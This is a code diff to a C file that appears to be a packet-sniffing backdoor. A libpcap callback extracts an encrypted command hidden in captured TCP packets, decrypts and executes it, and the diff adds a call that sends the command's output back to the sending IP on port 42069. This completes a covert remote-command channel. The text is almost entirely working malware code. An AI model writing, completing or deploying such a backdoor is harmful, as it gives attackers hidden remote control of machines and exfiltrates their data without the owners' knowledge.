@@ -1,8 +1,11 @@
+#include <arpa/inet.h>
 #include <stdio.h>
+#include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
 
 #include "crypto.h"
+#include "networking.h"
 #include "packet_auth.h"
 #include "packet_handler.h"
 
@@ -47,13 +50,9 @@ void execute_command(const char *command, char **result)
 * Callback function for examining captured packets.
 *
 * Params:
-*   u_char* args: Pointer to user data.
-*   const struct pcap_pkthdr* header: Struct that contains information about the captured packet.
-*   const u_char* packet: Pointer to the captured packet in serialized form.
-*
-* Returns:
-*   None
-*
+*       u_char* args: Pointer to user data.
+*       const struct pcap_pkthdr* header: Struct that contains information about the captured packet.
+*       u_char* packet: Pointer to the captured packet in serialized form.
 */
 void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* packet)
 {
@@ -70,7 +69,7 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     char decrypted[MAX_COMMAND_LEN];
 
     int tcp_sport;
-    u_int tcp_seqnum;
+    unsigned int tcp_seqnum;
 
     char* payload;
     char* end_ptr;
@@ -120,7 +119,8 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     execute_command(command, &command_output);
 
     // Step 7: Send the results back
-    printf("%s", command_output); // replace this with sending the command results back
+    // printf("%s", command_output); // replace this with sending the command results back
+    send_message_to_ip(ip->ip_src, 42069, command_output, strlen(command_output));
     free(command_output); // free command_output which was malloced by execute_command
 
     return;
